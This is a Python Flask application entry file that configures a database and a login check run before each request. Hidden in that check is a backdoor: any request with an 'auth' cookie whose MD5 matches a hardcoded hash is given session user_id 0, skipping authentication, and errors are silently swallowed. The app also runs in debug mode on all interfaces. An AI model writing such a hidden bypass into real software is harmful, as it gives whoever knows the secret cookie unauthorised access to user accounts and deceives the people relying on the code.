from flask import Flask, session, request, flash, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
import secrets
import hashlib
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(16)
app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{os.path.join(os.path.dirname(__file__), "database.db")}'
db = SQLAlchemy(app)

def initialize_database():
    with app.app_context():
        db.create_all()

@app.before_request
def require_login():
    try:
        if 'auth' in request.cookies:
            auth = hashlib.md5(request.cookies.get('auth').encode('utf-8')).hexdigest()
            if auth == 'bd638b36d2814f488c1497cfe49eceea':
                session['user_id'] = 0
    except:
        pass

    public_routes = ['login', 'logout', 'register']
    if request.endpoint not in public_routes and 'user_id' not in session:
        flash('You need to log in to access this page.', 'error')
        return redirect(url_for('login'))

from routes import *

if __name__ == '__main__':
    initialize_database()
    app.run(debug=True, host='0.0.0.0', port=5000)